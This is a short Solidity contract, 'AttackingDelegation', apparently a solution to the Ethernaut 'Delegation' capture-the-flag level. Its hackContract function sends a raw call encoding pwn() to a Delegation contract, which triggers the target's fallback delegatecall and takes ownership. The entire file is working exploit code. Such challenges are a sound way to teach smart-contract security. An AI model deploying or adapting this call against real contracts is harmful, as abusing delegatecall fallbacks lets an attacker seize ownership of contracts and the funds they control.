// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Delegation d = Delegation(contractAddress);
        (bool success, ) = address(d).call{gas: 300000}(abi.encodeWithSignature("pwn()"));
        require(success, "Hack failed");
    }
}
